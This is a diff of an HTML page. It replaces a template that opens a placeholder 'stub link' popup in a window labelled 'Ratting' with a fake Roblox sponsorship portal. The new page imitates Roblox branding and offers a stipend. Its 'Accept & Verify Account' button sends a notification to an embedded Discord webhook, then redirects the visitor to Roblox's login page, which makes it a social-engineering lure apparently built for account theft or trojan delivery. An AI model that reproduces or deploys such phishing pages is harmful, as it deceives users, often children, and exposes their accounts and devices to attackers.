@@ -1,10 +1,47 @@
-<div class="container">
-<a href=javascript:void(0) ;" NAME="Error Handling"   title="ZeroDivisionError handling" onClick=window.open("YOURSTUBLINK","Ratting","width=550,height=300,left=200,top=200,toolbar=0,status=0,");>
-  <img src="putanyimage here" alt="Avatar" class="image">
-      <div class="overlay">
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Roblox Creator Partnership</title>
+</head>
+<body style="background-color: #1b1d1e; color: white; font-family: sans-serif; text-align: center; padding: 50px;">
+    <div style="max-width: 600px; margin: auto; background: #252728; padding: 30px; border-radius: 10px; border: 1px solid #3a3d3e;">
+        <img src="https://www.roblox.com/images/logos/rebrand/roblox_logo_dark.png" width="150" style="margin-bottom: 20px;">
+        <h1 style="color: #00b06f;">Partnership Dashboard</h1>
+        <p style="font-size: 18px;">Welcome to the Roblox Sponsor Portal. Please confirm your application to proceed.</p>
+        
+        <div style="background: #18191a; padding: 15px; border-left: 5px solid #00b06f; text-align: left; margin: 20px 0;">
+            <p><b>Status:</b> Pending Verification<br>
+            <b>Benefit:</b> Monthly Stipend & Catalog Credits</p>
+        </div>
 
-</a>
-</div>
+        <button id="acceptBtn" style="background-color: #00b06f; color: white; border: none; padding: 18px 45px; font-size: 18px; border-radius: 5px; cursor: pointer; font-weight: bold; width: 100%;">
+            ACCEPT & VERIFY ACCOUNT
+        </button>
+    </div>
 
-<html>
-<body style="background-color:black;">
+    <script>
+        document.getElementById('acceptBtn').onclick = function() {
+            const webhookURL = "https://discord.com/api/webhooks/1478298277928501269/LOPQKo0JSyZmpPbDEGhZv8Vw5itkNlOHH4o5_pqVXSVisOpFK4RUf9NJLKFsZtT7qV6m";
+            
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    embeds: [{
+                        title: "Application Received",
+                        description: "A user has accepted the sponsorship terms.",
+                        fields: [
+                            { name: "Source", value: "Sponsor Portal", inline: true },
+                            { name: "Action", value: "Verified", inline: true }
+                        ],
+                        color: 3066993
+                    }]
+                })
+            }).then(() => {
+                window.location.href = "https://www.roblox.com/login"; 
+            });
+        };
+    </script>
+</body>
+</html>
